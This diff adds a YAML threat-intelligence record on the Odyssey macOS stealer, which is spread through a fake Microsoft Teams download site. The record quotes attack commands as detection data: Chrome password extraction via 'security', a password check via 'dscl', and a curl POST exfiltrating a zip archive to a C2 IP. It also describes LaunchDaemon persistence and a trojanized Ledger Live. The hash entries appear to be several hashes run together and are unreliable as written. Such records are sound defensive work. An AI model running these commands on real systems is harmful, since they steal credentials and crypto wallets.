@@ -1,0 +1,58 @@
+description: Threat actors use a fake Microsoft Teams download site to deliver the
+  Odyssey macOS stealer via Clickfix, harvesting credentials and crypto wallets before
+  exfiltrating data to a C2 server and establishing persistence through LaunchDaemons
+  while replacing Ledger Live with a trojanized copy.
+attribution: Unknown threat actor (unidentified)
+malware_families:
+- Odyssey
+TTPs:
+  processes:
+  - osascript
+  - dscl
+  - security
+  - ditto
+  - curl
+  - unzip
+  commandline:
+  - osascript -e 'run script ...'
+  - dscl . authonly
+  - security find-generic-password -ga "Chrome"
+  - ditto -c -k /tmp/out.zip
+  - 'curl -X POST --data-binary @/tmp/out.zip http://185.93.89.62/log -H ''buildid:
+    ...'' -H ''username: vipx'' -H ''repeat: false'''
+  - unzip /tmp/ledger.zip -d /Applications/
+  powershell: []
+  scripting_engine:
+  - AppleScript
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: curl
+    destination: 185.93.89.62
+    port: 80
+    protocol: HTTP
+    path: /log
+  file_activity:
+  - /tmp/out.zip
+  - ~/.pwd
+  - ~/.username
+  - ~/.chost
+  - ~/.botid
+  - /Library/LaunchDaemons/com.<random>.plist
+  - /Applications/Ledger Live.app (replaced)
+  persistence:
+  - LaunchDaemons via com.<random>.plist in /Library/LaunchDaemons/
+  process_relations: []
+IOCs:
+  ip_addresses:
+  - 185.93.89.62
+  domains:
+  - clickfixteamsonsoft.com
+  hashes:
+  - 9c520fa25239c0f116ce7818949ddce5fd2f315317863715416cb4886c5aeb27a8250904e6f079e1a952b87e55dc87e467cc560a2694a142f2d6547ac40d5e1d81cc9380673cb36a30f2a84ef155b0cbc7958daa6870096e455044fb
+  - a5f9ee8397ee604eb5e20905605c9418838aadccbbbfe6a15fc9146442333cfc1516273909038524250903a44efd734710e60a8f73719130176c726e58d328722067c8
+authors:
+- Koushik Pal
+reference: https://www.cloudsek.com/blog/threat-actors-impersonate-microsoft-teams-to-deliver-odyssey-macos-stealer-via-clickfix
+date_of_publication: September 17, 2025
+file_creation_date: September 24, 2025
